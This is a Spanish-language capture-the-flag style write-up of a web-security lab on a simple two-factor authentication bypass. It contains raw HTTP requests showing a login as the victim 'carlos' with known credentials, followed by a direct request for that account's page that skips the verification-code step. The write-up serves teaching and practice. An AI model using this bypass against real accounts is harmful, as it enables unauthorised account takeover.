# 🔏 Laboratorio: 2FA bypass simple

### Omitir la autenticación de dos factores

En ocasiones, la implementación de la autenticación de dos factores es defectuosa hasta el punto de que se puede omitir por completo.

Si primero se le solicita al usuario que ingrese una contraseña y luego se le solicita que ingrese un código de verificación en una página separada, el usuario se encuentra efectivamente en un estado de "iniciar sesión" antes de ingresar el código de verificación. En este caso, vale la pena probar para ver si puede pasar directamente a las páginas "solo para quienes han iniciado sesión" después de completar el primer paso de autenticación. Ocasionalmente, encontrará que un sitio web en realidad no verifica si completó o no el segundo paso antes de cargar la página.

### Laboratorio: bypass simple 2FA

APRENDIZ

LABORATORIONo resuelto

Se puede omitir la autenticación de dos factores de este laboratorio. Ya obtuvo un nombre de usuario y una contraseña válidos, pero no tiene acceso al código de verificación 2FA del usuario. Para resolver el laboratorio accede a la página de la cuenta de Carlos.

* Tus credenciales:`wiener:peter`
* Credenciales de la víctima`carlos:montoya`

```python
// Some code

Laboratorio: bypass simple 2FA



LOGUEO CON SUUARIO WIENER Y PASSWD PETER:


REQUEST:


GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close







POST /login HTTP/1.1
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=AMcztl8Lvb0cVagaQfxiS4en1nhiVjq1
Content-Length: 30
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

username=wiener&password=peter





CARGA UN SEGUNDO LOGIN2 QUE SERIA EL DE SEGUNDO FACTOR:





GET /login2 HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=YgHaeKl5mc0ncfDKIECGtg3dJmdGcs29
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9



PIDE CODIGO 4 DIGITOS DE SEGUNDO FACTOR:




MAIL:



GET /email HTTP/1.1
Host: exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close







Your email address is wiener@exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net
Displaying all emails @exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net and all subdomains
Sent	To	From	Subject	Body	
2024-01-21 06:45:12 +0000	wiener@exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net	no-reply@0ab800150391d6c28229e7a800cb00bd.web-security-academy.net	Security code	
Hello!

Your security code is 1012.

Please enter this in the app to continue.

Thanks,
Support team
View raw
2024-01-21 06:31:20 +0000	wiener@exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net	no-reply@0ab800150391d6c28229e7a800cb00bd.web-security-academy.net	Security code	
Hello!

Your security code is 1688.

Please enter this in the app to continue.

Thanks,
Support team











POST /login2 HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=YgHaeKl5mc0ncfDKIECGtg3dJmdGcs29
Content-Length: 13
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

mfa-code=1012






GET /my-account?id=wiener HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=CSc1Da8p1YfmBEfhcJSii5G6cGZHo1r7
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login2
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9






LOGUEADO EXITOSO CON WIENER:




My Account
Your username is: wiener

Your email is: wiener@exploit-0aaa00ae0346d64682d2e63f01850079.exploit-server.net

Email
 








INTENTO LOGUEO USUARIO CARLOS:



REQUEST:



GET /login HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=9UwZcPxQU9aXfbfOzyEdNMwRP9mCMzqT
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9







POST /login HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=9UwZcPxQU9aXfbfOzyEdNMwRP9mCMzqT
Content-Length: 32
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

username=carlos&password=montoya





CAMBIAMOS ANTES DE MANDAR LA SOLICITUD REQUEST DEL /LOGIN2 LA SALTEMAOS DIRECTAMENTE A ESTA SOLICITUD DELLA RUTA QUE NOS SOLICITA EL CODIGO DE SEGUNDO FACTOR; Y ANTES QUE SE ENVIE PARA QUE SE NOS MUESTRE; DIRECTAMENTE SOLICITAMOS LA RUTA DEL LOGIN CORRECTO DEL USUARIO CARLOS Y ASI ASEMOS UN SALTO OSEA UN BYPASS DE LA CONTRASEÑA DE SEGUNDO FACTOR 2FA: 




GET /my-account?id=carlos HTTP/2
Host: 0ab800150391d6c28229e7a800cb00bd.web-security-academy.net
Cookie: session=5m73Xh21XOgWSmhejv3mznsAseok0eIh
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0ab800150391d6c28229e7a800cb00bd.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9






BINGO SE TENZO ESATMOS COMO USUARIO CARLOS :D:





My Account
Your username is: carlos

Your email is: carlos@carlos-montoya.net

Email

```
